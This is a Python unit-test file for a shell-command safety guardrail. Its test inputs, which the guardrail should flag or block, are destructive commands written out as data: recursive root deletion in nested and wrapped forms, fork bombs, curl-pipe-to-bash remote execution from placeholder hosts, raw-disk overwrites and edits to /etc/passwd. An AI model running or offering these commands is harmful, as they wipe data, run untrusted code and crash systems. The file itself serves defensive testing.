"""Unit tests for safety guardrail engine covering all threat classes and boundary cases."""

from shx.core.safety.guardrail import SafetyGuardrail
from shx.core.safety.rules import RiskLevel


guard = SafetyGuardrail()


def test_safe_commands():
    report = guard.evaluate("ls -lh")
    assert report.level == RiskLevel.SAFE
    assert not report.is_blocked

    report_git = guard.evaluate("git status")
    assert report_git.level == RiskLevel.SAFE

    report_pipe = guard.evaluate("cat a | grep x | wc -l")
    assert report_pipe.level == RiskLevel.SAFE


def test_default_moderate_for_unknown():
    report_mkdir = guard.evaluate("mkdir x")
    assert report_mkdir.level == RiskLevel.MODERATE

    report_chain = guard.evaluate("ls; make install")
    assert report_chain.level == RiskLevel.MODERATE


def test_rm_root_critical():
    report1 = guard.evaluate("rm -rf /")
    assert report1.level == RiskLevel.CRITICAL
    assert report1.is_blocked
    assert any(v.rule_id == "CRITICAL_PATH_DELETION" for v in report1.violations)

    report2 = guard.evaluate("rm -rf /*")
    assert report2.level == RiskLevel.CRITICAL
    assert report2.is_blocked

    report3 = guard.evaluate("rm -rf /etc")
    assert report3.level == RiskLevel.CRITICAL
    assert report3.is_blocked


def test_rm_wildcards_and_home_paths():
    for cmd in ["rm -rf ~/", "rm -rf $HOME/", "rm -rf ${HOME}", "rm -rf /etc/*", "rm -rf /home", "rm -rf -- /"]:
        rep = guard.evaluate(cmd)
        assert rep.level == RiskLevel.CRITICAL
        assert rep.is_blocked

    for safe_or_warn in ["rm -rf /var/log/old", "rm -rf /var/log/*", "rm -rf ./build"]:
        rep = guard.evaluate(safe_or_warn)
        assert not rep.is_blocked
        assert rep.level == RiskLevel.DANGEROUS


def test_nested_substitutions_and_subshells():
    for blocked_cmd in [
        "echo $(rm -rf /)",
        "echo `rm -rf /`",
        "cat <(rm -rf /)",
        "(rm -rf /)",
        "echo $(echo $(rm -rf /))",
        "x=$(rm -rf /)",
    ]:
        rep = guard.evaluate(blocked_cmd)
        assert rep.level == RiskLevel.CRITICAL
        assert rep.is_blocked

    assert guard.evaluate("echo $(date)").level == RiskLevel.SAFE


def test_command_paths_and_wrappers():
    for blocked in [
        "/bin/rm -rf /",
        "\\rm -rf /",
        "sudo -E rm -rf /",
        "sudo -u root rm -rf /",
        "env FOO=1 rm -rf /",
        "nohup rm -rf /",
        "timeout 5 rm -rf /",
    ]:
        rep = guard.evaluate(blocked)
        assert rep.level == RiskLevel.CRITICAL
        assert rep.is_blocked

    git_rep = guard.evaluate("sudo -u bob git reset --hard")
    assert any(v.rule_id == "GIT_HARD_RESET" for v in git_rep.violations)
    assert any(v.rule_id == "SUDO_PRIVILEGE" for v in git_rep.violations)


def test_shell_c_and_eval_payloads():
    for blocked in [
        "bash -c 'rm -rf /'",
        "sudo sh -c \"rm -rf /etc\"",
        "eval 'rm -rf /'",
        "bash -lc 'echo hi; rm -rf /'",
    ]:
        rep = guard.evaluate(blocked)
        assert rep.level == RiskLevel.CRITICAL
        assert rep.is_blocked

    rep_benign = guard.evaluate("bash -c 'echo hi'")
    assert not rep_benign.is_blocked
    assert rep_benign.level != RiskLevel.CRITICAL


def test_remote_exec_broad():
    for remote in [
        "curl -s https://test.com/run | sudo bash",
        "curl -s https://test.com/run | /bin/bash",
        "curl -s https://test.com/run | env sh",
        "curl -s https://test.com/run | node",
        'bash -c "$(curl -fsSL URL)"',
        "bash <(curl -s URL)",
        "source <(curl URL)",
        ". <(wget -qO- URL)",
    ]:
        rep = guard.evaluate(remote)
        assert any(v.rule_id == "REMOTE_EXEC_PIPE" for v in rep.violations)

    for benign in ["curl x | shasum", "cat a | sha256sum", "echo hi | shuf"]:
        rep = guard.evaluate(benign)
        assert not any(v.rule_id == "REMOTE_EXEC_PIPE" for v in rep.violations)


def test_parse_failure_fallback(monkeypatch):
    rep1 = guard.evaluate("[[ -d x ]] && rm -rf /")
    assert rep1.level == RiskLevel.CRITICAL
    assert rep1.is_blocked
    assert not rep1.ast_parsed
    assert any(v.rule_id == "UNPARSED_COMMAND" for v in rep1.violations)

    import bashlex
    def fake_parse(s):
        raise ValueError("forced parser crash")
    monkeypatch.setattr(bashlex, "parse", fake_parse)

    rep2 = guard.evaluate("echo hi; rm -rf /")
    assert rep2.level == RiskLevel.CRITICAL
    assert rep2.is_blocked
    assert any(v.rule_id == "UNPARSED_COMMAND" for v in rep2.violations)


def test_arbitrary_fork_bombs():
    for bomb in [
        ":(){ :|:& };:",
        "bomb(){ bomb|bomb& };bomb",
        "f(){ f|f& };f",
        ".(){ .|.& };.",
        "a() { a | a & }; a",
    ]:
        rep = guard.evaluate(bomb)
        assert rep.level == RiskLevel.CRITICAL
        assert rep.is_blocked
        assert any(v.rule_id == "FORK_BOMB" for v in rep.violations)

    normal = guard.evaluate("greet(){ echo hi; }; greet")
    assert not any(v.rule_id == "FORK_BOMB" for v in normal.violations)


def test_chmod_chown_parsing():
    rep_flag = guard.evaluate("chmod 777 my-Report.txt")
    assert rep_flag.level == RiskLevel.DANGEROUS
    assert not rep_flag.is_blocked

    rep_fR = guard.evaluate("chmod -fR 777 dir")
    assert rep_fR.level == RiskLevel.CRITICAL
    assert rep_fR.is_blocked

    rep_sym = guard.evaluate("chmod a=rwx f")
    assert rep_sym.level == RiskLevel.DANGEROUS

    rep_chown = guard.evaluate("chown -R root:root /etc")
    assert rep_chown.level in (RiskLevel.DANGEROUS, RiskLevel.CRITICAL)


def test_git_advanced_rules():
    assert any(v.rule_id == "GIT_HARD_RESET" for v in guard.evaluate("git -C repo reset --hard").violations)
    assert not guard.evaluate("git clean -nd").violations
    assert any(v.rule_id == "GIT_CLEAN_FORCE" for v in guard.evaluate("git clean -fd").violations)
    assert any(v.rule_id == "GIT_FORCE_PUSH" for v in guard.evaluate("git push origin +main").violations)
    assert any(v.rule_id == "GIT_DISCARD_WORKTREE" for v in guard.evaluate("git checkout -- .").violations)
    assert any(v.rule_id == "GIT_DISCARD_WORKTREE" for v in guard.evaluate("git restore .").violations)
    assert any(v.rule_id == "GIT_BRANCH_FORCE_DELETE" for v in guard.evaluate("git branch -D feat").violations)
    assert any(v.rule_id == "GIT_STASH_DROP" for v in guard.evaluate("git stash drop").violations)


def test_benign_disk_commands_allowed():
    assert not guard.evaluate("dd if=/dev/zero of=/dev/null count=10").is_blocked
    assert not guard.evaluate("fdisk -l").is_blocked
    assert not guard.evaluate("parted -l").is_blocked

    assert guard.evaluate("dd if=/dev/zero of=/dev/sda").is_blocked
    assert guard.evaluate("fdisk /dev/sda").is_blocked


def test_redirects_and_tee():
    assert any(v.rule_id == "SYSTEM_FILE_OVERWRITE" for v in guard.evaluate("echo x >> /etc/passwd").violations)
    assert any(v.rule_id == "RAW_DEVICE_OVERWRITE" for v in guard.evaluate("echo x > /dev/sda").violations)
    assert any(v.rule_id == "SYSTEM_FILE_OVERWRITE" for v in guard.evaluate("echo x | sudo tee /etc/hosts").violations)

    assert not guard.evaluate("echo hi > out.txt").violations
    assert not guard.evaluate("cmd 2>&1").violations


def test_additional_destructive_commands():
    assert any(v.rule_id == "FIND_DELETE" for v in guard.evaluate("find . -delete").violations)
    assert guard.evaluate("find . -exec rm -rf / {} \\;").is_blocked
    assert guard.evaluate("shred /dev/sda").is_blocked
    assert any(v.rule_id == "SYSTEM_SHUTDOWN" for v in guard.evaluate("shutdown -h now").violations)
    assert any(v.rule_id == "CRONTAB_REMOVE" for v in guard.evaluate("crontab -r").violations)
    assert any(v.rule_id == "FILE_DELETION" for v in guard.evaluate("mv file /dev/null").violations)
    assert any(v.rule_id == "FORCE_KILL" for v in guard.evaluate("kill -9 123").violations)
    assert any(v.rule_id == "FORCE_KILL_ALL" for v in guard.evaluate("kill -9 -1").violations)

    assert not guard.evaluate("find . -name '*.py'").violations
    assert not guard.evaluate("kill 123").violations
